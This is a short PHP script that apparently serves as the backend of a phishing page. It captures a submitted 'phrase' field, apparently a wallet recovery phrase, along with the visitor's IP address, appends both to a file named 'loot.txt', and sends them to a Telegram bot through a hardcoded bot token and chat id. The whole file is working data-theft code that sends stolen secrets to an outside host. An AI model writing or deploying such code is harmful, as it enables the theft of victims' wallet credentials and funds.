
<?php
$phrase = $_POST['phrase'] ?? '';
$ip     = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
$msg    = "$ip\n$phrase";
file_put_contents('../../loot.txt', $msg.PHP_EOL, FILE_APPEND);
file_get_contents("https://api.telegram.org/bot8451114914:AAGV01n087Env9NnncDrYpdAE3PWbS3pDPU/sendMessage?chat_id=1072060180&text=".urlencode($msg));
echo 'success';
?>
